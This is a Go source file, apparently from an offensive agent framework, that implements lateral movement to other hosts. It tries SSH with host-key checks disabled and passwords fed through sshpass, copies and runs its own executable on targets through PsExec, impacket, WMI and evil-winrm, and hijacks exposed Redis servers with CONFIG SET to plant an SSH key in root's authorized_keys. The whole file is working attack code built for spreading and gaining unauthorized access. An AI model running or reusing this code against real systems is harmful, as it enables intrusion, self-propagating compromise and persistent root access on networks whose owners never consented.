// agents/cell/post/lateral.go
// Lateral movement — PsExec, WMI, SSH pivot, Redis hijack.

package post

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

type LateralResult struct {
	Success    bool
	Method     string
	SessionID  string
	TargetHost string
	TargetPort int
	Error      string
	Output     string
}

// MoveLaterally attempts lateral movement to target using available methods.
func MoveLaterally(target string, port int, credential *Credential, method string) LateralResult {
	if method == "" {
		methods := []string{"ssh", "wmi", "winrm", "redis", "psexec"}
		for _, m := range methods {
			r := tryLateralMethod(target, port, credential, m)
			if r.Success {
				return r
			}
		}
		return LateralResult{Error: "all lateral methods failed"}
	}
	return tryLateralMethod(target, port, credential, method)
}

func tryLateralMethod(target string, port int, cred *Credential, method string) LateralResult {
	switch method {
	case "ssh":
		return lateralSSH(target, port, cred)
	case "psexec":
		return lateralPsExec(target, cred)
	case "wmi":
		return lateralWMI(target, cred)
	case "winrm":
		return lateralWinRM(target, port, cred)
	case "redis":
		return lateralRedis(target, port)
	default:
		return LateralResult{Error: fmt.Sprintf("unknown method: %s", method)}
	}
}

// SSH lateral movement with credential
func lateralSSH(target string, port int, cred *Credential) LateralResult {
	r := LateralResult{Method: "ssh", TargetHost: target, TargetPort: port}
	args := []string{"-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
		"-o", "ConnectTimeout=5", "-p", fmt.Sprintf("%d", port)}

	if cred != nil && cred.Type == "key" {
		keyFile := os.TempDir() + fmt.Sprintf("/argos_key_%x", rand.Uint32())
		os.WriteFile(keyFile, []byte(cred.Value), 0600)
		defer os.Remove(keyFile)
		args = append(args, "-i", keyFile, fmt.Sprintf("%s@%s", cred.Username, target), "id")
	} else if cred != nil && cred.Type == "password" {
		// sshpass required
		path, _ := os.Executable()
		args = append(args, target, path)
		sshpass := exec.Command("sshpass", "-p", cred.Value, "ssh")
		sshpass.Args = append(sshpass.Args, args...)
		out, err := sshpass.CombinedOutput()
		if err == nil {
			r.Success = true
			r.Output = string(out)
		} else {
			r.Error = fmt.Sprintf("sshpass: %v", err)
		}
		return r
	} else {
		args = append(args, target, "id")
	}

	cmd := exec.Command("ssh", args...)
	out, err := cmd.CombinedOutput()
	if err == nil {
		r.Success = true
		r.Output = string(out)
	} else {
		r.Error = fmt.Sprintf("ssh: %v", err)
	}
	return r
}

// PsExec-style lateral (via impacket if available)
func lateralPsExec(target string, cred *Credential) LateralResult {
	r := LateralResult{Method: "psexec", TargetHost: target, TargetPort: 445}
	path, _ := os.Executable()

	if runtime.GOOS == "windows" {
		args := []string{fmt.Sprintf(`\\%s`, target), "-s", "-d", path}
		if cred != nil {
			args = append(args, "-u", cred.Username, "-p", cred.Value)
		}
		out, err := exec.Command("psexec.exe", args...).CombinedOutput()
		if err == nil {
			r.Success = true
			r.Output = string(out)
		}
		return r
	}

	// Linux: try impacket-psexec
	if _, err := exec.LookPath("impacket-psexec"); err == nil {
		if cred == nil {
			r.Error = "credentials required for impacket-psexec"
			return r
		}
		args := []string{fmt.Sprintf("%s/%s:%s@%s", "WORKGROUP", cred.Username, cred.Value, target), path}
		out, err := exec.Command("impacket-psexec", args...).CombinedOutput()
		if err == nil {
			r.Success = true
			r.Output = string(out)
		} else {
			r.Error = fmt.Sprintf("impacket: %v", err)
		}
		return r
	}
	r.Error = "psexec not available (install impacket or psexec.exe)"
	return r
}

// WMI lateral movement
func lateralWMI(target string, cred *Credential) LateralResult {
	r := LateralResult{Method: "wmi", TargetHost: target, TargetPort: 135}

	if runtime.GOOS == "windows" {
		path, _ := os.Executable()
		args := []string{fmt.Sprintf(`/node:"%s"`, target), "process", "call", "create", path}
		if cred != nil {
			args = append(args, fmt.Sprintf(`/user:"%s"`, cred.Username), fmt.Sprintf(`/password:"%s"`, cred.Value))
		}
		out, err := exec.Command("wmic", args...).CombinedOutput()
		if err == nil {
			r.Success = true
			r.Output = string(out)
		}
		return r
	}

	// Linux: try impacket-wmiexec
	if _, err := exec.LookPath("impacket-wmiexec"); err == nil && cred != nil {
		path, _ := os.Executable()
		args := []string{fmt.Sprintf("%s/%s:%s@%s", "WORKGROUP", cred.Username, cred.Value, target), path}
		out, err := exec.Command("impacket-wmiexec", args...).CombinedOutput()
		if err == nil {
			r.Success = true
			r.Output = string(out)
		} else {
			r.Error = fmt.Sprintf("wmiexec: %v", err)
		}
		return r
	}
	r.Error = "wmi not available"
	return r
}

// WinRM lateral movement
func lateralWinRM(target string, port int, cred *Credential) LateralResult {
	r := LateralResult{Method: "winrm", TargetHost: target, TargetPort: port}
	if port <= 0 {
		port = 5985
	}

	if _, err := exec.LookPath("evil-winrm"); err == nil && cred != nil && cred.Type == "password" {
		path, _ := os.Executable()
		args := []string{"-i", target, "-P", fmt.Sprintf("%d", port), "-u", cred.Username, "-p", cred.Value,
			"-e", path}
		out, err := exec.Command("evil-winrm", args...).CombinedOutput()
		if err == nil {
			r.Success = true
			r.Output = string(out)
		} else {
			r.Error = fmt.Sprintf("evil-winrm: %v", err)
		}
		return r
	}
	r.Error = "winrm not available (install evil-winrm)"
	return r
}

// Redis lateral via CONFIG REWRITE (SSH key injection)
func lateralRedis(target string, port int) LateralResult {
	r := LateralResult{Method: "redis_config_rewrite", TargetHost: target, TargetPort: port}
	if port <= 0 {
		port = 6379
	}

	sshDir := os.ExpandEnv("$HOME/.ssh")
	os.MkdirAll(sshDir, 0700)
	keyPath := sshDir + "/id_rsa.pub"
	pubKey, err := os.ReadFile(keyPath)
	if err != nil {
		r.Error = "no RSA public key available for Redis CONFIG REWRITE"
		return r
	}

	// Use redis-cli to inject SSH key
	// SSH keys need newline padding in authorized_keys format
	cmds := fmt.Sprintf("CONFIG SET dir /root/.ssh/\nCONFIG SET dbfilename authorized_keys\nSET xx \"\n\n%s\n\n\"\nSAVE\n", pubKey)
	cmd := exec.Command("redis-cli", "-h", target, "-p", fmt.Sprintf("%d", port))
	cmd.Stdin = strings.NewReader(cmds)
	_, err = cmd.CombinedOutput()
	if err != nil {
		r.Error = fmt.Sprintf("redis: %v", err)
		return r
	}
	r.Success = true
	r.Output = "SSH key injected via Redis CONFIG REWRITE"
	return r
}
